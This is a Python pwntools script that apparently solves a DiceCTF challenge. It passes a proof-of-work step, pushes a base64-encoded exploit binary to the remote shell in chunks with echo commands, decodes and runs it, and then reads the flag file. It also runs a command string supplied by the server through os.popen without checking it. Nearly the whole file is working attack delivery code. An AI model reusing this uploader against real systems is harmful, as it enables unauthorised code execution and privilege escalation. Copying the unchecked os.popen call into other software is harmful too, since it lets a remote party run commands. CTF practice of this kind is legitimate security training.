#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./exploit"
LIBCNAME = ""

hosts = ("dicec.tf","localhost","localhost")
ports = (31691,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  c.recvuntil("Send the output of: ")
  hashcat = c.recvline().rstrip().decode('utf-8')
  print("[+] calculating PoW...")
  hash_res = os.popen(hashcat).read()
  print("[+] finished calc hash: " + hash_res)
  c.sendline(hash_res)

  with open("./exploit.b64", 'r') as f:
    binary = f.read()
  
  progress = 0
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+0x80] for i in range(0, len(binary), 0x80)]:
    c.sendlineafter('$', 'echo {} >> exploit.b64'.format(s))
    progress += 0x80
    if progress % 0x1000 == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
  c.sendlineafter('$', 'base64 -d exploit.b64 > exploit')

  c.sendlineafter('$', './exploit')
  c.sendlineafter('$', 'cat /home/ctf/flag.txt')



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
